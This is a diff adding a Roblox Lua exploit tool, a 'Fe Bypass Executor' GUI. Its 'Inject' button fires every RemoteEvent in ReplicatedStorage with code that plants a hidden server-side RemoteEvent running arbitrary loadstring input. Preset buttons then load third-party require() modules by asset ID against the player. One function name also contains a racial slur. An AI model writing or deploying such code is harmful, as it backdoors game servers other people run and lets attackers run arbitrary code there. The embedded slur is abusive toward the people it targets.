@@ -1,0 +1,230 @@
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local UserInputService = game:GetService("UserInputService")
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "FeBypassGui"
+gui.ResetOnSpawn = false
+gui.Parent = playerGui
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0.6, 0, 0.55, 0)
+mainFrame.Position = UDim2.new(0.2, 0, 0.2, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+mainFrame.BorderSizePixel = 2
+mainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+mainFrame.Parent = gui
+mainFrame.Active = true
+mainFrame.Draggable = true
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0.12, 0)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+title.Text = "Fe Bypass Executor"
+title.TextScaled = true
+title.Font = Enum.Font.SourceSansBold
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Parent = mainFrame
+
+local button7x4x2x1 = Instance.new("TextButton")
+button7x4x2x1.Size = UDim2.new(0.15, 0, 0.12, 0) -- Smaller size to fit beside the title
+button7x4x2x1.Position = UDim2.new(0.85, 0, 0, 0) -- Positioned to the right of the title
+button7x4x2x1.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+button7x4x2x1.Text = "7x4x2x1"
+button7x4x2x1.TextScaled = true
+button7x4x2x1.Font = Enum.Font.SourceSansBold
+button7x4x2x1.TextColor3 = Color3.fromRGB(255, 255, 255)
+button7x4x2x1.Parent = mainFrame
+button7x4x2x1.Active = false -- Disabled by default
+
+local textBox = Instance.new("TextBox")
+textBox.Size = UDim2.new(0.9, 0, 0.55, 0)
+textBox.Position = UDim2.new(0.05, 0, 0.15, 0)
+textBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+textBox.BorderSizePixel = 2
+textBox.BorderColor3 = Color3.fromRGB(255, 0, 0)
+textBox.Text = "Enter script here..."
+textBox.TextScaled = true
+textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+textBox.Font = Enum.Font.SourceSansBold
+textBox.Parent = mainFrame
+
+local executeButton = Instance.new("TextButton")
+executeButton.Size = UDim2.new(0.28, 0, 0.1, 0)
+executeButton.Position = UDim2.new(0.05, 0, 0.75, 0)
+executeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+executeButton.Text = "Execute"
+executeButton.TextScaled = true
+executeButton.Font = Enum.Font.SourceSansBold
+executeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+executeButton.Parent = mainFrame
+
+local clearButton = Instance.new("TextButton")
+clearButton.Size = UDim2.new(0.28, 0, 0.1, 0)
+clearButton.Position = UDim2.new(0.37, 0, 0.75, 0)
+clearButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+clearButton.Text = "Clear"
+clearButton.TextScaled = true
+clearButton.Font = Enum.Font.SourceSansBold
+clearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+clearButton.Parent = mainFrame
+clearButton.MouseButton1Click:Connect(function()
+    textBox.Text = ""
+end)
+
+local injectButton = Instance.new("TextButton")
+injectButton.Size = UDim2.new(0.28, 0, 0.1, 0)
+injectButton.Position = UDim2.new(0.69, 0, 0.75, 0)
+injectButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+injectButton.Text = "Inject"
+injectButton.TextScaled = true
+injectButton.Font = Enum.Font.SourceSansBold
+injectButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+injectButton.Parent = mainFrame
+
+local quitosButton = Instance.new("TextButton")
+quitosButton.Size = UDim2.new(0.3, 0, 0.1, 0)
+quitosButton.Position = UDim2.new(0.67, 0, 0.88, 0)
+quitosButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+quitosButton.Text = "Quitos Premium"
+quitosButton.TextScaled = true
+quitosButton.Font = Enum.Font.SourceSansBold
+quitosButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+quitosButton.Parent = mainFrame
+quitosButton.Active = false
+
+local polariaButton = Instance.new("TextButton")
+polariaButton.Size = UDim2.new(0.3, 0, 0.1, 0)
+polariaButton.Position = UDim2.new(0.34, 0, 0.88, 0)
+polariaButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+polariaButton.Text = "Polaria"
+polariaButton.TextScaled = true
+polariaButton.Font = Enum.Font.SourceSansBold
+polariaButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+polariaButton.Parent = mainFrame
+polariaButton.Active = false
+
+local h01pkButton = Instance.new("TextButton")
+h01pkButton.Size = UDim2.new(0.3, 0, 0.1, 0)
+h01pkButton.Position = UDim2.new(0.01, 0, 0.88, 0)
+h01pkButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+h01pkButton.Text = "H01PK"
+h01pkButton.TextScaled = true
+h01pkButton.Font = Enum.Font.SourceSansBold
+h01pkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+h01pkButton.Parent = mainFrame
+h01pkButton.Active = false
+
+local isInjected = false
+injectButton.MouseButton1Click:Connect(function()
+    if not isInjected then
+        local function injectBackdoor(obj)
+            for _, v in pairs(obj:GetChildren()) do
+                if v:IsA("RemoteEvent") then
+                    v:FireServer([[
+                        local folder = Instance.new('RemoteEvent')
+                        folder.Name = "_FEBYPASS32"
+                        folder.Parent = game:GetService("JointsService")
+                        local loadstring = require(13684410229)
+                        folder.OnServerEvent:Connect(function(_1,_2)
+                            loadstring(_2)()
+                        end)
+                    ]])
+                end
+                injectBackdoor(v)
+            end
+        end
+        injectBackdoor(game:GetService("ReplicatedStorage"))
+
+        local maxTime = 5
+        local elapsedTime = 0
+        repeat wait(0.1) elapsedTime += 0.1 until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or elapsedTime >= maxTime
+
+        if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+            injectButton.Text = "Injected"
+            isInjected = true
+            quitosButton.Active = true
+            quitosButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+            polariaButton.Active = true
+            polariaButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+            h01pkButton.Active = true
+            h01pkButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+            button7x4x2x1.Active = true -- Enable the 7x4x2x1 button after injection
+            button7x4x2x1.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        else
+            warn("Injection failed!")
+        end
+    else
+        warn("Already injected!")
+    end
+end)
+
+-- 7x4x2x1 Button Functionality
+button7x4x2x1.MouseButton1Click:Connect(function()
+    if isInjected then
+        local scriptText = 'require(139432417777343).T7x1V5("' .. player.Name .. '")'
+        textBox.Text = scriptText
+    else
+        warn("Inject first to use 7x4x2x1!")
+    end
+end)
+
+executeButton.MouseButton1Click:Connect(function()
+    local scriptText = textBox.Text
+    if scriptText and scriptText ~= "" then
+        if isInjected then
+            local success, err = pcall(function()
+                game:GetService("JointsService")._FEBYPASS32:FireServer(scriptText)
+                print("Require Script Executed Successfully!")
+            end)
+            if not success then
+                warn("Execution Error: " .. err)
+            end
+        else
+            local success, err = pcall(function()
+                loadstring(scriptText)()
+                print("Lua Script Executed Successfully!")
+            end)
+            if not success then
+                warn("Execution Error: " .. err)
+            end
+        end
+    else
+        warn("Script is empty!")
+    end
+end)
+
+quitosButton.MouseButton1Click:Connect(function()
+    if isInjected then
+        local requireScript = 'require(136199913883937):Pload("' .. player.Name .. '")'
+        textBox.Text = requireScript
+    else
+        warn("Inject first to use Quitos Premium!")
+    end
+end)
+
+polariaButton.MouseButton1Click:Connect(function()
+    if isInjected then
+        local requireScript = 'require(123255432303221):Pload("' .. player.Name .. '")'
+        textBox.Text = requireScript
+    else
+        warn("Inject first to use Polaria!")
+    end
+end)
+
+h01pkButton.MouseButton1Click:Connect(function()
+    if isInjected then
+        local requireScript = 'require(0x4af2144545ce).ALLNIGGAITISKINGV44LEAKKKkh01pkOnTOP("' .. player.Name .. '")'
+        textBox.Text = requireScript
+    else
+        warn("Inject first to use H01PK!")
+    end
+end)
+
+-- Toggle GUI with Alt key
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if input.KeyCode == Enum.KeyCode.LeftAlt or input.KeyCode == Enum.KeyCode.RightAlt then
+        gui.Enabled = not gui.Enabled
+    end
+end)
